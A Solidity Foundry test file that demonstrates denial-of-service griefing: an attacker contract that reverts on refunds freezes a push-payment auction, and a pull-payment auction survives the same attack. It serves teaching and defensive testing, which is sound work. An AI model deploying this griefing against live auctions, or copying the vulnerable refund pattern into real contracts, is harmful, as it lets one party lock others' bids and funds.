// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableAuction, SafeAuction, RevertingBidder} from "../src/dos/PushPayment.sol";

/// PoC for denial-of-service via a reverting recipient (push-payment griefing).
///   forge test --match-contract DosGriefingRevert -vvv
///
/// Invariant (SC10/SC02): one participant must not be able to block others. The push-refund auction
/// hands a permanent veto to a contract bidder whose `receive` reverts; the pull-payment auction
/// keeps working and lets honest bidders reclaim funds themselves.
///
/// See docs/exploits/dos-griefing-revert.md
contract DosGriefingRevertTest is Test {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function test_vulnerable_revertingLeaderLocksTheAuction() public {
        VulnerableAuction auction = new VulnerableAuction();

        // Alice bids honestly.
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        auction.bid{value: 1 ether}();
        assertEq(auction.highestBidder(), alice);

        // Attacker becomes the leader with a contract that rejects refunds.
        RevertingBidder evil = new RevertingBidder();
        vm.deal(address(this), 2 ether);
        evil.bid{value: 2 ether}(address(auction));
        assertEq(auction.highestBidder(), address(evil));

        // Now NOBODY can outbid: refunding the evil leader always reverts.
        vm.deal(bob, 3 ether);
        vm.prank(bob);
        vm.expectRevert(bytes("refund failed"));
        auction.bid{value: 3 ether}();

        assertEq(auction.highestBidder(), address(evil), "auction is frozen on the attacker");
    }

    function test_safe_pullPaymentSurvivesRevertingLeader() public {
        SafeAuction auction = new SafeAuction();

        vm.deal(alice, 1 ether);
        vm.prank(alice);
        auction.bid{value: 1 ether}();

        RevertingBidder evil = new RevertingBidder();
        vm.deal(address(this), 2 ether);
        evil.bid{value: 2 ether}(address(auction));
        assertEq(auction.highestBidder(), address(evil));

        // Bob still outbids — the evil leader's refund is only credited, never pushed.
        vm.deal(bob, 3 ether);
        vm.prank(bob);
        auction.bid{value: 3 ether}();
        assertEq(auction.highestBidder(), bob, "auction keeps working");

        // Alice reclaims her outbid funds herself (pull).
        uint256 before = alice.balance;
        vm.prank(alice);
        auction.withdraw();
        assertEq(alice.balance, before + 1 ether, "honest bidder recovers funds");
    }
}
